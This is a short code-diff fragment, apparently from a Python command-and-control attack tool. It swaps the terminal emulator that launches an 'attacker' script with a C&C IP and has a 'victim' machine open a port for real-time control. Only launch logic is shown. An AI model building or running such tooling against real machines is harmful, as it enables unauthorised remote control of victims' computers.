@@ -92,7 +92,7 @@ def main():
 	#When realtime is enabled
 	elif realtime == True:
 		#Open a new terminal and make the victim pc open a port
-		subprocess.run(['kitty', '--detach', 'python3', 'attackerDelayed.py', config.cncIP, str(PORT), "python3 victimRealTime.py"])
+		subprocess.run(['gnome-terminal', '-x', 'python3', 'attackerDelayed.py', config.cncIP, str(PORT), "python3 victimRealTime.py"])
 
 		#Waits until the victim port is open
 		while checkSocketOpen(VICTIM, PORT) != 0:
